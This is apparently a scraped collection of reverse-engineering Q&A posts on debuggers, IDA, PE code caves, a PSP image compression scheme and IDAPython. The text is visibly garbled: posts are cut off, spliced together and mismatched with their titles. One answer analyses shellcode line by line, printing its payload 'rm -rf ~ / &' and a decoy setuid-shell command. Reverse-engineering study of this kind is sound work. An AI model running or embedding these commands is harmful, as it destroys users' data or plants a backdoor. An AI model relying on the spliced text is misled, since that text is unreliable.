Nowadays the vector instruction sets are becoming quite a <em>fashion</em> in a certain way (vector <code>CPUs</code> were the standard for supercomputers back in the 70s &amp; 80s - Cray's, ThinkingMachine's, ... computer were all vector based). In the past few years, Intel came up with many versions of <code>SSE</code> and two new IS called <code>AVX</code> &amp; <code>AVX2</code> (Advanced Vector Extension) with 256bit wide vectors implemented on SandyBridge/IvyBridge/Haswell, and <code>AVX-512</code> first implemented on the KNC (Knight's Corner) of the Xeon Phi processor &amp; co-processor line.</p>

       */

      /*
         Copying the first a3 bytes of a2 into buff + 4. 
         The + 4 is to jump the 4 bytes header set to 0 previously.

      memcpy(buf + 4, a2, a3); //There's no point in 4 * a3 / 4;

      //Size has changed to a3 + 4 (4 bytes for the header)

       /* _DWORD is 4 bytes. This line converts v7 into an integer to

<p>From this I would say that this routine sends a packet with the header set to GetTickCount() / 10 if there's no message (a2 == NULL or a3 &lt;= 0), otherwise it sets the message header to 0, the message itself to a2 and sends the packet.</p>

<p>The thing about the original version you provided is that it was performing a copy 4 elements by 4 ... That's why the <code>memcpy</code> was split in two. The first one copying the elements 4 * (a3 / 4) (if a3 = 19 then it would've copied 16 elements), the second one copying the remaining a3 % 4 (a3 % 4 &lt;==> a3 &amp; (4 - 1) &lt;==> a3 &amp; 3) elements (if a3 = 19 then it would've copied 3). </p>

","<p>On 64-bit Windows, any 32-bit process trying to access <code>C:\Windows\system32</code> is transparently redirected to <code>C:\Windows\SysWOW64</code>. </p>

<p>Since IDA (Both <code>idaq.exe</code> and <code>idaq64.exe</code>) are 32-bit processes, you are actually opening <code>C:\Windows\SysWOW64\ntdll.dll</code> (which is a 32-bit file) instead of <code>C:\Windows\system32\ntdll.dll</code>.</p>

"OllyDbg: Keep comments & labels in rebased DLL","876","","<p>My program loads and unloads a DLL of main interest at runtime.
I try to add comments and labels to the DLLs code, but when it is unloaded and loaded again, they are gone, as the DLL is rebased most of the time.</p>

<p>I'm in search for an OllyDbg plugin to preserve the comments and labels when a DLL gets rebased (for Olly 1, but this task is that important that I'd also switch to Olly 2 if there is a plugin only for 2).</p>

<ul>
<li>I tried <a href=""http://www.openrce.org/downloads/details/107/Labelmaster"" rel=""nofollow"">Labelmaster</a>, it can export and import comments and labels into text files. But the addresses in the textfiles are completely static and do not respect rebased DLLs.</li>
<li>A forum user <a href=""http://www.blizzhackers.cc/viewtopic.php?f=71&amp;t=310891&amp;start=0"" rel=""nofollow"">posted a plugin named ""Dynamic Debugging""</a> which would solve my problems as it can load stored comments and labels with a base address I can manually specify. However, the thread is from 2006, and the download cannot be found on the net anymore, not even in archives.</li>
</ul>

<p>Anyone knowing a plugin or still having the ""Dynamic Debugging"" plugin?</p>
","<p>OllyDbg2 supports this.</p>

<hr>

<p>For OllyDbg1:</p>

<p>I have extended the Labelmaster plugin mentioned above. It now subtracts the current modules base before exporting the labels and comments and adds the current modules base when importing them. Thus it's now requried to have the correct module focused when importing the files.</p>

<p>I also added importing label and comment files at once (but still with two open file dialogs and two different files, too lazy now to optimize this).</p>

<p>You can download the LabelmasterEx plugin by me here: </p>

<p>To convert your current Labelmaster exports, here's my Excel worksheet subtracting the bases from them: </p>

<hr>

<p>Another possibility of forcing ASLR off to get the same bases every time a DLL is loaded did not work for me. For those who want to try it: Start a Visual Studio Developer prompt (yeah, you'd need VS) and type in</p>

<pre><code>editbin /DYNAMICBASE:NO C:\Game\game.exe

CPPLib.dll</p>

<p>Moreover, even if I define it manually (e.g. choose Arg1 to be memory buffer 1) when calling that function it does not take what I wanted to be an argument. And there is no other way to change this argument as step into a function, find memory address to which it refers and change it there.</p>

<p>So my question is: Why does OllyDbg detect number of input arguments in functions (and allows to alter them easily) from USER32.dll and doesn't in my own DLL? How can I overcome this problem?</p>
","<p>i compiled the src in commandline (no vs using ewdk)<br>
and it appears ollydbg is able to identify the args and the call export seems to succeed here with some random crap thrown in for s    </p>

<p>i assume you are aware std::string is a structure and not a plain string<br>
you may need to properly craft a std::string and point the address of the std::string<br>
for you to see it in messagebox in the argument field </p>

<p>well for whatever it is worth here is a screenshot of my dab with what was posted and its results   </p>

<h2><strong>EDIT</strong></h2>

<p>std::string is a structure as i mentioned </p>

<p>your s if you debugged your executable directly should be like this </p>

<pre><code>0:000&gt; dt -r9 s
Local var @ 0x22f984 Type std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;*
0x0022f98c
   +0x000 _Mypair          : std::_Compressed_pair&lt;std::_Wrap_alloc&lt;std::allocator&lt;char&gt; &gt;,std::_Str
ing_val&lt;std::_Simple_types&lt;char&gt; &gt;,1&gt;
      +0x000 _Myval2          : std::_String_val&lt;std::_Simple_types&lt;char&gt; &gt;
         +0x000 _Bx              : std::_String_val&lt;std::_Simple_types&lt;char&gt; &gt;::_Bxty
            +0x000 _Buf             : [16]  ""USER INPUT""
            +0x000 _Ptr             : 0x52455355  ""--- memory read error at address 0x52455355 ---""
            +0x000 _Alias           : [16]  ""USER INPUT""
         +0x010 _Mysize          : 0xa
         +0x014 _Myres           : 0xf
   =6e2a0000 npos             : 0x905a4d
0:000&gt;
</code></pre>

<p>so if you notice std::string contains a small performance optimization 
like if the string is less than 0x10 bytes it doesn't allocate memory but uses the buffer directly  if the string is bigger than 0x10 bytes it allocates memory </p>

<p>it has a size and max size members at 0x10 and 0x14 from the start of buffer   ie foo.cstr() you may need to properly set them  see below two snap shots one for a bigger std::string and one for a smaller std::string </p>

<p>you should recognize 4021c0 as loaddlls dump1 space </p>

<p>hope that helps </p>

<p>as to why ollydbg shows two args may be it is a bug in the olly engine </p>

<p>according to windbg it is only one parameter </p>

"How to create function prototype that recognizes arguments passed by reference in IDA Pro","871","","<p>I have a function prototype generated by IDA that looks like this:</p>

<p>Any help or suggestions would be greatly appreciated!</p>
","<p>My guess is that the function signature should be something like:</p>

<pre><code>int __usercall Call_HTTP@&lt;eax&gt;(int x, int y, void* http_object@&lt;edi&gt;);
</code></pre>

<ul>
<li><code>__usercall</code> means the calling convention for the function is not a standard one (like stdcall, cdecl, etc.) as the function passes two arguments on stack and one in edi.</li>
<li><code>@&lt;eax&gt;</code> : function returns a value in eax register.</li>
<li><code>int x</code> and <code>int y</code> are passed on the stack.</li>
<li><code>void* http_object@&lt;edi&gt;</code> : http_object is a void* passed through the edi register.</li>
</ul>

<p>You can change the type of the <code>http_object</code> by adding a proper structure for this object to the known IDA structures and pass the real type instead of <code>void*</code>.</p>

<p>The right signature should be:</p>

<pre><code>int __userpurge Call_HTTP@&lt;eax&gt;(int x, int y, void* http_object@&lt;edi&gt;);

<p>As stated by @itsbriany:</p>

<ul>
<li>for <code>__stdcall</code> and <code>__userpurge</code> calling conventions, the callee cleans up the stack.</li>

"Working with multi-threaded program but can not find created thread","870","","<p>i am analyzing a piece of code in which the main thread does the following steps:</p>

<p>First, it calls CreateProcess() to create a a process in suspended state. Then it changes the starting address of the thread by using a combination of GetThreadContext &amp; SetThreadContext. The new start address of the thread is now 00401E1D. And at the end, it calls ResumeThread() start the thread.</p>

<p>So, what I did was: I set a BP at ResumeThread(), let it run, after hitting the BP I step over the ResumeThread()-function and open the window where all threads are listed by clicking on the big ""T""-button in Ollydbg.</p>

<p>But there is only the main thread, not the newly started thread. 
And now I have a couple of questions:</p>

<pre><code> 1st question: Why it is not in the list ?

 2nd question: How can I find it?

 3th question: 
 In the main thread, I can not step to 00401E1D 
 (starting address of the new thread) because ollydbg somehow 
  terminates itself. Maybe there is some anti-debugging tricks or 
  things like that. I do not know, because I did not analyze it yet
  in detail. So, the question is: Is there a way to analyze the 
  new thread starting at 00401E1D in a separate ollydbg-session ?
  Is it possible ?
</code></pre>

<p>best regards, </p>
","<p>In addition to creating the child process, <code>CreateProcess()</code> also causes the creation of the child process's primary thread. Your post makes it sound like the calls to <code>GetThreadContext()</code>, <code>SetThreadContext()</code>, and <code>ResumeThread()</code> all act on that primary thread.</p>

<blockquote>
  <p>1st question: Why it is not in the list ?</p>
</blockquote>

<p>As you said in your post, you are seeing the process's main (primary) thread, on which the <code>*Thread*()</code> API functions above acted. No additional threads are created so you shouldn't expect to see additional threads in OllyDbg's view.</p>

Is there a resource I am unaware of?</p>

<p><a href=""http://www.cs.toronto.edu/~peter/feiner_asplos_2012.pdf"" rel=""nofollow"">Here's</a> an example. </p>
","<p>Yes, there is DynamoRIO Kernel (DRK), which is a DynamoRIO (DR) port created by Peter Feiner at the University of Toronto (U of T). The current DR source tree; however, does not contain DRK, despite the existence of a branch. DRK has yet to be open sourced, and U of T is actively doing kernel DBT research using DRK and a new DBT framework.</p>

<p>If you are thinking of porting it yourself, the two main challenges are:</p>

<ul>
<li>Interrupts and how they interact with the code cache. DRK took the ""direct port"" approach. For example, where DR uses thread-private code caches, DRK uses CPU-private code caches. This results in a lot of annoyances w.r.t. transparency and interrupts.</li>
<li>What level of transparency you want. DR was designed with a lot of transparency in mind, and DRK kept that promise. My experience with kernel instrumentation so far has been that it is remarkably well-behaved (unless you care about a small portion of device drivers). Transparency on several fronts can be sacrificed, but this is more challenging within the general DR framework.</li>

"Adding a new PE section for a code cave","849","","<p>I am trying to add a 1000 byte code cave using LordPE to a standalone exe. From what I understand I have to edit the PE header with a new section of 1000 bytes then open the exe in a hex editor and add 1000 bytes to the end of the file.</p>

<p>When I add the new section the offset is not at the end of the file and It actually points to existing code. If I change the <code>RawOffset</code> to match the actual end of file <code>0xAE370</code> it gets corrupted. </p>

<p>Why won't the new section get added at the real end of file? Also, how can I add a new 1000 byte section without corrupting the file?</p>

<p><strong>Update:</strong>  The debugger still wasn't perfect on the location of the new section in the memory map but I can see my new bytes ~200h down from where they are listed. To get it to work I had to:</p>

<ul>
<li>Add the new section using CFF </li>
<li>Save it and open the file in a hex editor to find the true RawOffset</li>
<li>Then manually change the RawOffset in CFF to where my new bytes were actually placed by CFF <code>0xAE378</code></li>
<li>Back in CFF right click and rebuild PE header and rebuild image size (not sure if rebuilding the size part was necessary)</li>
<li>Now in the debugger navigate to where it says .NewSec is and scroll down a few hundred bytes and the new inserted bytes are there</li>
</ul>

<p>Still not sure why the memory map is slightly off but it's not too bad. I suppose once you find them you could edit the virtual address of the section to reflect where it actually is once loaded into memory.</p>

<p><a href=""https://i.stack.imgur.com/56Mgq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/56Mgq.png"" alt=""enter image description here""></a></p>
","<p>Adding sections to PE files is not always as simple as editing the sections table. Sometimes you'll have to handle several edge cases such as menifest, signatures and other potential end-of-file optional ""extensions"".</p>

<p>Although LordPE is a great tool, it isn't the <em>best</em> tool for this task. It is too low-level, and doesn't let you create a complete new section transparently. It will let you edit the different fields as required for adding the new section, but you'll have to handle everything yourself.</p>

<p>There are more advanced PE editors, such as <a href=""http://www.ntcore.com/exsuite.php"" rel=""noreferrer"">CFF Explorer</a>, that provide the functionality to create sections from scratch. It will increase the file size of you and create a section you can directly edit from within CFF Explorer.</p>

<p>To add a new section, open a file with CFF Explorer, select the Section Headers option from the lefthand tree view, right click on the sections table, select the ""Add Section (Empty Space)"" option like in the following picture:</p>

<p><a href=""https://i.stack.imgur.com/zqXLq.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/zqXLq.png"" alt=""enter image description here""></a></p>

<p>Then, specify the size of the new section.</p>

<p>To edit the new section select it, and use the bottom panel to modify, paste, copy or fill the hex view of the section. You can right click on it to open a menu with additional editing options.</p>

"idapython - Get Xrefs to a stack variable","848","","<p>I am trying to write an IDAPython script that will return a list of references to a local stack-frame variable. However, I couldn't find any API that does so.</p>

<p>What I am trying to achieve is a code like:
<code>xrefs = get_variable_references('arg_4')</code> that will return the results corresponding with the GUI's results:</p>

<p><a href=""https://i.stack.imgur.com/TB4B7.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/TB4B7.png"" alt=""GUI&#39;s results""></a></p>

<p>Thanks in advance.</p>
","<p>There is one function that does this: <code>build_stkvar_xrefs</code>, defined in C++ but exposed via the Python SWIG bindings. IDA builds stack xrefs dynamically when you ask for it. In order to use the function, it requires a little bit of setup.</p>

<p>You'll need to use a few functions to get what you need:</p>

<ul>
<li><code>get_func(ea)</code>: retrieves the <code>func_t</code> structure for the function at <code>ea</code></li>
<li><code>get_frame(func_t foo)</code>: returns the <code>struct_t</code> structure for the
function frame specified by <code>foo</code></li>
<li><code>DecodeInstruction(ea)</code>: returns the <code>inst_t</code> representing instruction at <code>ea</code></li>
<li><code>get_stkvar(op_t op, sval_t v)</code>: <code>op</code> is a reference to an instruction, <code>v</code> is the immediate value in the operand. Usually you just use <code>op.addr</code>. It returns a tuple, <code>(member_t, val)</code>. <code>member_t</code> is a pointer to the stack variable, which is what we need. <code>val</code> is the same value as the <code>soff</code> field in the <code>member_t</code> for the stack var. More on this later.</li>
<li><code>xreflist_t()</code>: creates a new <code>xreflist</code> of <code>xreflist_entry_t</code></li>
<li><code>build_stkvar_xrefs(xreflist_t xrefs, func_t func, member_t member)</code>: fills xrefs with <code>xreflist_entry_t</code>'s that represent the stack var xrefs given by <code>member</code> in <code>func</code>.</li>
<li><code>struct_t.get_member(x)</code>: You can use this method to iterate all stack variables in a frame to retrieve all <code>member_t</code>'s. If you want to build xrefs for all stack variables, this is usually easier.</li>
</ul>

<p>Here's an example of how this all ties together:</p>

<pre><code># 0x4012d0 is the function address
# 0x4012dc is an instruction address referencing
# a stack variable. It looks like:
# mov [ebp - 4], ecx

pFunc = get_func(0x4012d0)
pFrame = get_frame(pFunc)
inst = DecodeInstruction(0x4012dc)
op = inst[0] #first operand references stack var
pMember, val = get_stkvar(op, op.addr)
xrefs = xreflist_t()
build_stkvar_xrefs(xrefs, pFunc, pMember)
for xref in xrefs:
    print hex(xref.ea) #print xref address

# Contrived member dictionary example.
dictMem = dict()
x = 0
while(x &lt; pFrame.memqty):
    dictMem[GetMemberName(pFrame.id, pFrame.get_member(x).soff)] = pFrame.get_member(x)
    x = x+1
# given var name you can now use the
# dictionary to grab the member_t to pass
# to build_stkvar_xrefs
pMem = dictMem[""var_4""]
xrefs = xreflist_t()
build_stkvar_xrefs(xrefs, pFunc, pMem)
for xref in xrefs:
    print hex(xref.ea) #print xrefs to var_4
</code></pre>

<p><code>soff</code> isn't a stack offset. I think it means ""structure offset"", and it's an offset into the frame structure so you can retrieve other bits of information. You'll need this field to use other stack variable related functions such as: SetMemberType, SetMemberName, GetMemberName, DelStrucMember, etc. </p>

<p>So, for a simple on the fly variable name to xref lookup, you can do something like:</p>

<pre><code>def get_stack_xrefs(func_ea, var_name):
    pFunc = get_func(func_ea)
    pFrame = get_frame(pFunc)
    pMember = None
    result = []
    while(x &lt; pFrame.memqty):
        if GetMemberName(pFrame.id, pFrame.get_member(x).soff) == var_name:
           pMember = pFrame.get_member(x)
           break; 
        x = x+1
    if pMember: 
        xrefs = xreflist_t()
        build_stkvar_xrefs(xrefs, pFunc, pMember)
        for each in xrefs:
            result.append(each.ea)
    return result
</code></pre>

<p>If you want more information on these functions, I recommend taking a look at the following modules from the IDA SDK documentation (in no particular order):</p>

<li>funcs.hpp</li>
<li>frame.hpp</li>

"Why does IDA add ""db"" statements between disassembled code","848","","<p>I'm trying to analyze a MS-DOS COM file that I wrote a few years ago with IDA Free 5.0, I've since renamed the segment to <code>code_and_data</code> and named constants and set data types correctly. However, when looking at the disassembly, I get <code>db</code> pseudo-instructions in the listing, like this:</p>

<pre>

code_and_data:0110                 db      3Eh
code_and_data:0110                 cmp     byte ptr ds:3C0h, 'A'

code_and_data:0120                 db      3Eh
code_and_data:0120                 cmp     byte ptr ds:3C4h, 'O'
code_and_data:0126                 jnz     short call_original_dos_interrupt_handler
code_and_data:0128                 db      3Eh

code_and_data:0133                 pop     bx
</pre>

<p>I understand that there are no additional bytes there, since the <code>db</code> and the <code>cmp</code> instruction after it start at the same address (see left column). Why does IDA show/add those <code>db</code> pseudo-instructions?</p>

<p>Is there any way to tell it to not show those, or is there a reason why it might be useful (I could only guess that since the same segment is both used for code and data, it tries to be ""helpful"" and show the code as data as well)?</p>

<p>But if so, why does it only show the first byte of the instruction (if you look at the addresses on the left again, these instructions are longer than 1 byte).</p>
","<p>The byte <code>3Eh</code> is the encoding of the segment override <code>DS:</code>. You observe it in an instruction like</p>

<pre><code>cmp     byte ptr ds:3BEh, 'C'
</code></pre>

<p>The hex encoding of this instruction is (I did this manually, some bit might be wrong)</p>

<pre><code>3E    - segement override prefix
80    - 8 bit ALU instruction
3E    - mod/rm byte (reg = 7 -&gt; instruction is CMP, mod = 0/rm = 6 -&gt; immediate address)
BE 03 - offset of data to compare
43    - immediate data byte
</code></pre>

<p>The sequence <code>3E 80 3E BE 03 53</code> is 6 bytes long, which matches the actual instruction length of 6 bytes (<code>010Eh - 0108h</code>). If you assemble the assembler source code as given by IDA using a standard x86 assembler (like <code>MASM</code>), the <code>DS:</code> prefix will be ommitted, because the addressing mode ""immediate address"" is relative to the data segment <em>by default</em>. IDA shows the extra <code>DB</code> instruction to tell you (or an assembler that tries to re-assemble the listing) that the redundant, superflous segment prefix is actually encoded in the binary. If you want to hide that information, check Options -> General -> Analysis -> ""Processor specific analysis options"" -> ""Don't display redundant instruction prefixes"".</p>

"gdb on FreeBSD and follow-fork-mode child","844","","<p>Long time ago I noticed that using</p>

<blockquote>
  <p>set follow-fork-mode child </p>
</blockquote>

<p>in GDB on FreeBSD doesn't really work. 
This problem occurs very often with some challenges on various Capture The Flag contests.
For example, a server will spawn a child which would handle the connection.
The child code has a vulnerability which I would like to debug, but gdb just never follows 
the childs execution and I can't really observe the vulnerability being triggered.</p>

<p>So far, I've solved this problem in two ways:</p>

<ol>
<li><p>Making a connection, waiting for a child to spawn and than attaching GDB to it.</p>

<p>This works since the spawned child has it's own PID to which I can attach, but is rather painful since first I have to make a connection from one session, attach with GDB in another, and then send the payload/continue the connection in the first. </p></li>
<li><p>Patching the binary after the fork call to continue the execution in the parent process instead of the child. </p>

<p>This is also painful since then I have to restart the whole parent process to create another debugging session.</p></li>
</ol>

<p>There are some other tricks that can be employed, but these are enough to illustrate my point. </p>

<p>Now I know there have been some limitations on FreeBSD in the past regarding this but has anything improved? </p>

<p>Is there any way to patch GDB to add this functionality? Any suggestions for an easier way of overcoming this?</p>

<p>What is it really? I can see <code>/bin/sh</code> and a call to <code>execve</code> so I guess it's some kind of shellcode, but I don't understand how it's run in this example (the <code>char esp[] __attribute__ ((section(”.text”)))</code> part).</p>
","<p>It's not run in the example. It's a shellcode, it has to be somehow injected (for example using a buffer overflow vulnerability).
To understand how it works, let's first put some addresses on the strings:</p>

<pre><code>00000045  ""/bin/sh""
0000004D  ""-c""
0000004F  ""cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;""
</code></pre>

<p>Let's look at the disassembly piece by piece.</p>

<pre><code>00000000  EB3E              jmp short 0x40
00000002  5B                pop ebx        ; 1st argument for execve(): filename = ""/bin/sh""
00000003  31C0              xor eax,eax    ; eax = 0
00000005  50                push eax       ; envp[0] = NULL, argv[3] = NULL
00000006  54                push esp
00000007  5A                pop edx        ; 3rd argument for execve(): envp = {NULL}
...
00000040  E8BDFFFFFF        call dword 0x2
00000045  ""/bin/sh""
...
</code></pre>

<p>The jmp/call is a well known trick: the call will push the address of the following instruction to the stack. This gets popped into ebx, which now contains the address to ""/bin/sh"". In a system call, ebx is the first argument.
Next, eax is zeroed using a xor instruction and pushed to the stack. The pointer to those four zero bytes is stored in esp, which ends up in edx (3rd argument). The envp parameter of execve() is terminated with a null pointer: no environment vars in this case. This will also be used in argv.</p>

<pre><code>00000008  83EC64            sub esp,byte +0x64    ; Reserve 0x64 bytes on the stack
0000000B  68FFFFFFFF        push dword 0xffffffff ; Push 4th string word

0000001F  54                push esp
00000020  5E                pop esi             ; esi = esp
00000021  F716              not dword [esi]     ; Not 1st string word: 0x2d206d72 'rm -'

00000026  F75608            not dword [esi+0x8] ; Not 3rd string word: 0x26202f20 ' / &amp;'
00000029  F7560C            not dword [esi+0xc] ; Not 4th string word: 0x00000000 (NULL terminator)
0000002C  83C474            add esp,byte +0x74  ; Restore esp
</code></pre>

<p>""rm -rf ~ / &amp;"" is pushed NOT-encoded into the stack and decoded in place. esi points to the decoded string.</p>

<pre><code>0000002F  56                push esi            ; argv[2] = ""rm -rf ~ / &amp;""
00000030  8D7308            lea esi,[ebx+0x8]   ; esi = address of ""-c""
00000033  56                push esi            ; argv[1] = ""-c""
00000034  53                push ebx            ; argv[0] = ""bin/sh""
00000035  54                push esp
00000036  59                pop ecx    ; ecx = 2nd argument for execve(): argv = {""/bin/sh"", ""-c"", ""rm -rf ~ / &amp;"", NULL}
00000037  B00B              mov al,0xb ; 11 = execve() system call
00000039  CD80              int 0x80   ; execve()
</code></pre>

<p>It's time to build the argv array and make the call. The previous piece of code restored esp, so whatever is pushed will be after that first 0x00000000. Piece by piece the arguments are pushed to the stack. Remember that ebx held the pointer to ""/bin/sh"" (7 chars + terminator), so ebx+8 will be ""-c"". The null word that was pushed into the stack at the very beginning of the shellcode is reused as the terminator for argv.</p>

<pre><code>0000003B  31C0              xor eax,eax
0000003D  40                inc eax        ; 1 = exit() system call
0000003E  EBF9              jmp short 0x39 ; exit()
</code></pre>

<p>Using xor+inc eax is set to 1, which is system call exit(). It then jumps to the int 0x80 instruction and exit() is called.</p>

"identification/reverse engineer lz compression","832","","<p>I am doing a translation project for the PSP version of a game released by Prototype (Japanese company), but I am having trouble with some GIM files (image files). 
Now the actual problem is not with the gim format, but a compression that has been placed on the gim files, but before that I will clarify a few things.
Some of the GIM's work, however sometimes a GIM file appears that neither puyotools or GimConv (software that converts gim to png) can handle. The GIM that doesn't work is a little different in appearance.
I know its a GIM file because it starts with: MIG.00.1PSP, though to be exact, its a little different and written like this:</p>

<p><code>[integer equals 16, signature?] [integer equals 131792] [MIG.00.1PSP, but where a 00 HEX is placed between each hex byte]
</code></p>

<p>like this:</p>

<p><code>10 00 00 00 D0 02 02 00 4D 00 49 00 47 00 2E 00 30 00 30 00
2E 00 31 00 50 00 53 00 50 00 00 00</code></p>

<p>Each of the compressed GIM files starts with these two integers values (however an image I have with smaller resolution has a different second integer). I have allready tried removing these two integers and also tried replacing M(00)I(00)G(00).(00)0(00)0(00).(00)1(00)P(00)S(00)P(00), with simply MIG.00.1PSP, but that just ended up making GIMConv saying: wrong chunk data.</p>

<p>Also I have tried analyzing the file with signsrch and TrID to look for hints of some sort, but signsrch finds nothing and TrID only finds: ""100 .0% (.) LTAC compressed audio (v1.61) (1001/2)""</p>

<p>Here is the file called: black.gim (a black image)

<p>Here is a random CG: 
<img src=""https://i.stack.imgur.com/W1UrT.png"" alt=""enter image description here""></p>

<p>Here is a random gim file for refference to how an uncompressed version should look like. Notice that the first 4 bytes of the second line indicates the file size minus 16. 
Another thing is the int after MIG.001.PSP, which I from different sources has found to be the version number. Therefore, all the compressed files should problably get that int there too.
<img src=""https://i.stack.imgur.com/pTza1.png"" alt=""enter image description here"">
Update: I believe this is some kind of lz compression, but I haven't figured out which one yet. Tried lz01,lz00,lz10,lz11,CXLZ, lzss . It seems to me that it begins with a 10 byte like lz, it makes MIG.001.PSP become seperated by 00, due to the compression relying on value, key pair, where I believe the key 0 means that values should be directly send to the output. &lt;- if you are confident that its one of the compressions I have tried, please say so too as it could very well just be the tools I used to try those compressions that was wrong with. GZIP and deflate was tried using .NET's System.IO.Compression in C# and the others has been tried using something called Puyo tools.</p>

<p>Update: It seams like I have it almost figured out, basicly a key equals zero outputs value to decompressed data. If key is higher than zero, then get the short value of [Value,key-1]. This short plus 8 times two gives the byte it has to write out twice to decompressed data. In other words, 00 00 08 01 would output 00 00 00. The only problem with this is that 0f 01 in my black.gim example at line 3. This would point to 15 which would be position (15 + 8)*2 equals byte 46 which should be 02 00 in line two. This is however incorrect! Since I expect it to place zeroes there, not output 02 02..</p>

<p>In short in the black.gim example I have found that:
0C 01 should output 00 00
0D 01 should output 00 00 00
0F 01 should output 00 00</p>

<p>Any suggestions?</p>

<p>I'll be really happy if anybody could give me some input or lead :)</p>
","<p>Here is the complete answer to everyone who may encounter compressed GIM file of simular compression.
Basicly the file starts like this:
[magic number 10 00 00 00] [Integer with uncompressed size of file]
After this the compressed file begin.
The compression basicly functions like this: (in terms of decompression)</p>

<p><strong>-> Take the next 2 bytes.</strong></p>

<p><strong>-> Is the second byte equals zero?</strong></p>

<ul>
<li>Write first byte to decompressed output.</li>
</ul>

<p><strong>-> Is the second byte higher than 0?</strong></p>

<p>This is a pointer whose job is to make use of bytes used before. The position it points to is equals the unsigned short value of: [first byte, second byte minus 1]*2 + 8. When a pointer reads at the position it points to, it will read the next 4 bytes and not just the next 2 bytes. If the bytes at the pointed location is: 00 02 0C 01, then the decompressed output would be 02 ?? where ?? would be the result of the first two bytes of what its pointing at. In other words, if we pointed to 0C 01 02 00, then the output 0C 01 would be replaced by the result whatever its pointing to.Lets say it points to 08 00 00 00, then the output of the last pointer would be 08 00 00 00, which would replace 0C 01 and become: 08 00 00 00 02 00, which lastly would output 08 00 02 to decompressed output. *Notice that a pointer placed as the second byte cannot be replaced by four bytes, but only by the first two bytes of what would normally have been the result. If the second byte is pointing to the first byte, then it will simply be given the result of the first byte.</p>

<p>Examples from the image from the first post (Black.gim):
In the first image: 0c 01 points to 00 00 0C 01, which outputs 00 00.
In the first image 0d 01 points to 0C 01 0C 01, which outputs 00 00 00. &lt;- notice how only the first two bytes at a pointed position has the right to extend the result of what pointed to it by two bytes.
In the first image: 0F 01 points to 02 00 0D 01, which outputs 02 00</p>

<p><strong>-> do this until no bytes remains..</strong></p>

<p>About the suggested LZJB, I'll check right away. In case its right, I have still gotten quite the experience about reverse engineering files.</p>

"How do you optimise AST's or convert them to a real language","831","","<p>I have been interested in automatic vulnerability assessment and decompilation of code for a while now.

"How is IDAPython API structured?","829","","<p>In IDA's documentation, there are references to modules named <code>ida_*</code>, as well as <code>idc</code>, <code>idaapi</code> and <code>idautils</code>. The former modules seem to be the lower level ones. Almost always it says that <code>IDA Plugin SDK API wrapper: &lt;some_module&gt;</code>. </p>

<p>I have a few specific questions about the documentation and IDAPython:</p>

<ol>
<li>What is this IDA plugin SDK? Is it the C like API available in IDC?</li>
<li>Do the higher level API allow access to all the lower level functionalities?</li>
<li>What can't I seem to load lower level modules? (When I try to <code>import ida_lines</code>, IDA says <code>ImportError: No module named ida_lines</code>)</li>
</ol>
","<p><em>A bit of history:</em> (aka an aging guy blabbering about) </p>

<p>In the old days, we didn't have python in IDA and when an individual wanted to develop an IDA plugin he had to implement it in C and use the SDK available from hex-ray's <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""noreferrer"">download center</a> using credentials received when you purchase an IDA license. We did have, however, IDC. IDC is IDA's old, proprietary and somewhat deprecated scripting language, this is not related to C however there is evident effort using a C-like syntax. It was commonly used in the past but IDAPython nearly replaced it completely. The only reason to see IDC now is for old code, that precedes IDAPython.</p>

<p>Since then, IDAPython was developed (originally as a plugin using the aforementioned SDK, and then adopted by hex-rays and made part of IDA). Up until the recent IDA 6.95, we only had a single module exposing all of IDA's C SDK in python. That module was <code>idaapi</code>. <code>idc</code> is implementing higher level functions that were migrated from IDC into IDAPython. <code>idautils</code> implements some more high level functions, that weren't there before. those are rough divisions, and not entirely accurate. The important point here is that there was a single (long) python file exposing all SDK functions (that are exposed to python using <a href=""http://www.swig.org/"" rel=""noreferrer"">SWIG</a>).</p>

<p>In IDA 6.95 we still have that, but it was also the first version to include multiple <code>ida_*</code> modules where are to replace the broad <code>idaapi</code>. <code>idaapi</code> is only included in 6.95 for backwards compatibility and should be expected to be dropped in IDA 7. Generally, the names of the modules (what follows the <code>ida_</code> prefix) are the names of the header files in which those functions are defined. For example, <code>ida_lines</code> will expose functions defined in <code>lines.h</code>.</p>

<p><em>Actual answers</em>:</p>

<ol>
<li>The IDA plugin SDK is a collection of C header files and binary libraries that allow a third party develop IDA plugins using the provided API. It can be downloaded from the <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""noreferrer"">download center</a> and it's documentation is available <a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/"" rel=""noreferrer"">here</a>.</li>
<li>While the C SDK is pretty well documented, the IDAPython not so much. I often find browsing the SDK useful when developing IDAPython plugins, as functions are usually exposed to python but not documented or described as well as they are in the SDK. basically most of the functions correspond and you'll find the same functions having the same name in both IDAPython and the SDK (as this is mostly automatically generated code by/for <a href=""http://www.swig.org/"" rel=""noreferrer"">SWIG</a>).</li>
<li>First guess would be you're using an older version of IDA, where <code>ida_*</code> modules don't yet exist. generally, using <code>idaapi</code> instead of every other module will do just fine.</li>
</ol>

<p><em>Developing for IDA:</em></p>

<p>A person interested in developing for IDA has three options:</p>

<ul>
<li>Writing C code using the IDA SDK and compiling it, having a <code>plw</code> or a <code>p64</code> binary as output.</li>
<li>Writing IDC code. This is a decent scripting language recembling a simplified C in syntax. output would be a text file.</li>
<li>Writing IDAPython code. This is mostly python using the additional modules available when running from within IDA, plus a simple IDA plugin interface required to register as a plugin.</li>

"In-memory patching of .net code","827","","<p>Are there techniques for patching .net executables <em>in memory</em>? Let's say we've have a .net dll/exe, we identified what method we want to patch and what IL to replace the existing code with. Executing this on the binary file is easy (let's assume it does not have a strong name for simplicity). But what if we want to leave the file intact? Is it possible to make the patch in-memory? Maybe it is possible to write an exe loader that would intercept dll loading and re-write IL on the fly somehow?</p>

<p>The problem is that once the code is in memory it is no longer IL, but natively compiled, and thus, our knowledge of what method we want to patch with which IL does not help us a lot. So it looks like doing this during load time is the only way which might allow us not modifying the original files on disk. Is this possible?</p>

"Understanding subtle differences between addressing modes in X86","827","","<p>I'm trying to have a whole picture of all the possible addressing modes of X86 instructions. Starting from this I studied the Intel IA-32 reference and multiple secondary references found online.</p>

